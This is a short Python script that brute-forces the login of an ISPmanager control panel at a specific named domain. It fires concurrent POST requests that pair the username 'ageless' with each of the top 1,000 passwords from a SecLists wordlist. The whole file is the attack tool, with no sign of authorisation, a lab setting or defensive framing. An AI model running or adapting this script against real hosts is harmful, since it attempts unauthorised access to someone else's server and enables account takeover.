import asyncio
import async_timeout
from aiohttp import ClientSession

fp = open('/home/andrew/SecLists/Passwords/10_million_password_list_top_1000.txt')  # open file on read mode
lines = fp.read().split("\n")  # create a list containing all lines
fp.close()  # close file


url='http://ageless.su/manager/ispmgr'

async def lol():
	async with ClientSession(loop=asyncio.get_event_loop()) as session:
		tasks = []
		for password in lines:
			tasks.append(fetch(session, password))
		return await asyncio.gather(*tasks)


async def fetch(session, password):
	print('Fetching password {}'.format(password))
	try:
		with async_timeout.timeout(10):
			async with session.post(url, data={
				"username": "ageless",
				"password": password,
				"theme": "sirius",
				"lang": "en",
				"func": "auth",
			}) as response:
				return response
	except Exception as e:
		print("Http get exception {}".format(e))


loop = asyncio.get_event_loop()
results = loop.run_until_complete(lol())
loop.close()
print(results)